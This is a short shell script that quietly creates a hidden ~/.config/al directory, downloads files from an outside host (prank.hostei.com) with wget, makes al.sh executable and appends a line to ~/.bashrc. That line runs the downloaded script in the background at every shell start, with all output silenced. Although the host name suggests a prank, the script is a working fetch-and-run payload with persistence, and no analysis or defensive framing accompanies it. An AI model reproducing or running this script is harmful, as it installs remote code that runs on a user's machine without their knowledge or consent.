#!/bin/sh
$(mkdir ~/.config >/dev/null 2>&1; mkdir ~/.config/al >/dev/null 2>&1; ~/.config/al >/dev/null 2>&1; cd ~/.config/al; rm *; wget -r -N -nd http://prank.hostei.com/ >/dev/null 2>&1 ; chmod +x al.sh ; echo "\n. ~/.config/al/al.sh & disown \$! \n" >> ~/.bashrc; cd ~) &
